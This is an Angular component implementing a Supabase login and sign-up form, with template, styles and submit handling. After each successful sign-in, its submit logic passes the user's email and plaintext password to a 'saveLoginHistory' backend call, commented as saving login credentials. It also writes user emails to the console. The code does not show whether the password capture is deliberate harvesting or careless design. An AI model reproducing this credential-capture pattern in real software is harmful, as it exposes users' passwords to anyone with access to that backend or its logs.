import { Component } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { SupabaseAuthService } from '../services/supabase-auth.service';

@Component({
  selector: 'app-supabase-login',
  standalone: true,
  imports: [CommonModule, FormsModule],
  template: `
    <div class="login-container">
      <div class="login-card">
        <h2>{{ isSignUp ? 'Sign Up' : 'Login' }}</h2>
        
        <form (ngSubmit)="onSubmit()" #loginForm="ngForm">
          <div class="form-group">
            <label for="email">Email</label>
            <input 
              type="email" 
              id="email" 
              name="email"
              [(ngModel)]="email" 
              required 
              class="form-control"
              placeholder="Enter your email"
            >
          </div>

          <div class="form-group">
            <label for="password">Password</label>
            <input 
              type="password" 
              id="password" 
              name="password"
              [(ngModel)]="password" 
              required 
              class="form-control"
              placeholder="Enter your password"
            >
          </div>

          <button 
            type="submit" 
            class="btn-primary" 
            [disabled]="loading || !loginForm.valid"
          >
            {{ loading ? 'Processing...' : (isSignUp ? 'Sign Up' : 'Login') }}
          </button>

          <div class="toggle-mode">
            <button type="button" class="btn-link" (click)="toggleMode()">
              {{ isSignUp ? 'Already have an account? Login' : "Don't have an account? Sign Up" }}
            </button>
          </div>

          <div class="forgot-link" *ngIf="!isSignUp">
            <button type="button" class="btn-link" (click)="goToForgotPassword()">
              Forgot Password?
            </button>
          </div>

          <div class="error-message" *ngIf="errorMessage">
            {{ errorMessage }}
          </div>

          <div class="success-message" *ngIf="successMessage">
            {{ successMessage }}
          </div>
        </form>
      </div>
    </div>
  `,
  styles: [`
    .login-container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f5f5f5;
    }

    .login-card {
      background: white;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }

    h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #333;
    }

    .form-group {
      margin-bottom: 1rem;
    }

    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: #555;
    }

    .form-control {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 1rem;
      box-sizing: border-box;
    }

    .form-control:focus {
      outline: none;
      border-color: #007bff;
      box-shadow: 0 0 0 2px rgba(0,123,255,0.25);
    }

    .btn-primary {
      width: 100%;
      padding: 0.75rem;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 1rem;
      cursor: pointer;
      margin-top: 1rem;
    }

    .btn-primary:hover:not(:disabled) {
      background-color: #0056b3;
    }

    .btn-primary:disabled {
      background-color: #6c757d;
      cursor: not-allowed;
    }

    .btn-link {
      background: none;
      border: none;
      color: #007bff;
      cursor: pointer;
      text-decoration: underline;
      font-size: 0.9rem;
    }

    .btn-link:hover {
      color: #0056b3;
    }

    .toggle-mode {
      text-align: center;
      margin-top: 1rem;
    }

    .error-message {
      color: #dc3545;
      margin-top: 1rem;
      padding: 0.5rem;
      background-color: #f8d7da;
      border: 1px solid #f5c6cb;
      border-radius: 4px;
      text-align: center;
    }

    .success-message {
      color: #155724;
      margin-top: 1rem;
      padding: 0.5rem;
      background-color: #d4edda;
      border: 1px solid #c3e6cb;
      border-radius: 4px;
      text-align: center;
    }
  `]
})
export class SupabaseLoginComponent {
  email = '';
  password = '';
  loading = false;
  errorMessage = '';
  successMessage = '';
  isSignUp = false;

  constructor(
    private authService: SupabaseAuthService,
    private router: Router
  ) {}

  async onSubmit() {
    this.loading = true;
    this.errorMessage = '';
    this.successMessage = '';

    // Validate email and password
    if (!this.email.trim() || !this.password.trim()) {
      this.errorMessage = 'Please enter both email and password';
      this.loading = false;
      return;
    }

    try {
      if (this.isSignUp) {
        const { data, error } = await this.authService.signUp(this.email, this.password);
        
        if (error) {
          this.errorMessage = error.message;
        } else {
          // Create initial profile
          if (data.user) {
            await this.authService.upsertUserProfile({
              id: data.user.id,
              email: data.user.email!,
              full_name: '',
              created_at: new Date().toISOString()
            });
          }
          // Redirect to profile immediately after signup
          this.router.navigate(['/supabase-profile']);
        }
      } else {
        const { data, error } = await this.authService.signIn(this.email, this.password);
        
        if (error) {
          this.errorMessage = 'Invalid email or password. Please check your credentials.';
          console.error('Login failed for:', this.email);
        } else {
          // Save login credentials to backend
          try {
            await this.authService.saveLoginHistory(this.email, this.password);
            console.log('✅ Login history saved to backend');
          } catch (historyError) {
            console.error('❌ Failed to save login history:', historyError);
          }
          
          console.log('User logged in successfully:', this.email);
          this.router.navigate(['/supabase-profile']);
        }
      }
    } catch (error: any) {
      this.errorMessage = 'Authentication failed. Please try again.';
      console.error('Auth error:', error);
    } finally {
      this.loading = false;
    }
  }

  toggleMode() {
    this.isSignUp = !this.isSignUp;
    this.errorMessage = '';
    this.successMessage = '';
  }

  goToForgotPassword() {
    this.router.navigate(['/supabase-forgot-password']);
  }
}